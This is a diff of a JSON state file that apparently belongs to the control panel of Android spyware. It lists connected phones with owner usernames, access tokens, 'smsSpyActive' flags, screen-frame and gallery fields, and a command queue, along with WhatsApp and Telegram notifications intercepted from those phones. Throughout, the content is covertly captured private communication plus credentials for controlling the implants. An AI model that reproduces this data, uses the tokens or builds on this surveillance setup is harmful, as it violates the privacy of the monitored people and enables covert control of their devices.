@@ -5572,6 +5572,22 @@
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
+        "content": "‎‎3116 pesan dari 18 chat",
+        "time": "21/04 18:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776769365353
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "STOCK¹ NEW DAVID 18 STR X OWN: ~ JRIN CEO PP BOMEL",
+        "content": "isi slot own & pt & pp pm aja",
+        "time": "21/04 18:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776769365343
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
         "content": "‎‎3115 pesan dari 17 chat",
         "time": "21/04 18:02",
         "pkg": "com.whatsapp",
@@ -9552,22 +9568,6 @@
         "time": "21/04 17:29",
         "pkg": "com.whatsapp",
         "receivedAt": 1776767394066
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3777 pesan dari 19 chat",
-        "time": "21/04 17:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776767394059
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3776 pesan dari 19 chat",
-        "time": "21/04 17:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776767393518
       }
     ],
     "galleryPhotos": [],
@@ -9586,7 +9586,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776769358384,
+    "lastSeen": 1776769363140,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -9627,7 +9627,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776769358395,
+    "lastSeen": 1776769364269,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -9643,6 +9643,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 18:02",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769359609
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -13634,14 +13642,6 @@
         "time": "21/04 17:40",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776768032672
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 17:40",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776768032558
       }
     ],
     "galleryPhotos": [],
@@ -13660,7 +13660,7 @@
     "deviceName": "HP-BBBB-732D",
     "ownerUsername": "pian",
     "token": "06c7d23d86c7cc434c3d79ed0920fb91",
-    "lastSeen": 1776769358385,
+    "lastSeen": 1776769364525,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:59:07.158Z",
